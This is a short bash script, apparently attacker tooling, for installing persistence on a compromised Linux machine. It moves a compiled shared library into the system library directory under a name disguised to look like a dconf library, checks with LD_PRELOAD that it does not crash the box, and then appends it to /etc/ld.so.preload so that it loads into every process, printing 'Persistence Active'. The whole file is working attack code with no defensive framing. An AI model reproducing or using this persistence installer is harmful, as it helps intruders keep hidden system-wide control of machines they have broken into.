#!/usr/bin/env bash
# To run on target machine after copying the compiled .so to /tmp/libdconf-update.so

SO_SRC="/tmp/libdconf-update.so"
SO_DEST="/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99"

# -- Existence Check --
if [[ ! -f "$SO_SRC" ]]; then
    echo "[-] Error: Library not found at $SO_SRC"
    exit 1
fi

# -- Move and Set Permissions --
mv "$SO_SRC" "$SO_DEST"
chown root:root "$SO_DEST"
chmod 644 "$SO_DEST"

# -- SAFETY CHECK --
# Run /bin/true while preloading library
# If library is broken, /bin/true will fail, and script stops to avoid bricking box
echo "[*] Verifying library integrity..."
if ! LD_PRELOAD="$SO_DEST" /bin/true; then
    echo "[-] CRITICAL FAILURE: Library is unstable or corrupt!"
    echo "[-] Removing $SO_DEST to prevent system brick."
    rm "$SO_DEST"
    exit 1
fi

# -- Activation -- 
# (Only reached if safety check passes)
if ! grep -q "$SO_DEST" /etc/ld.so.preload 2>/dev/null; then
    echo "$SO_DEST" >> /etc/ld.so.preload
    echo "[+] Integrity verified. Persistence Active."
else
    echo "[*] Persistence already exists."
fi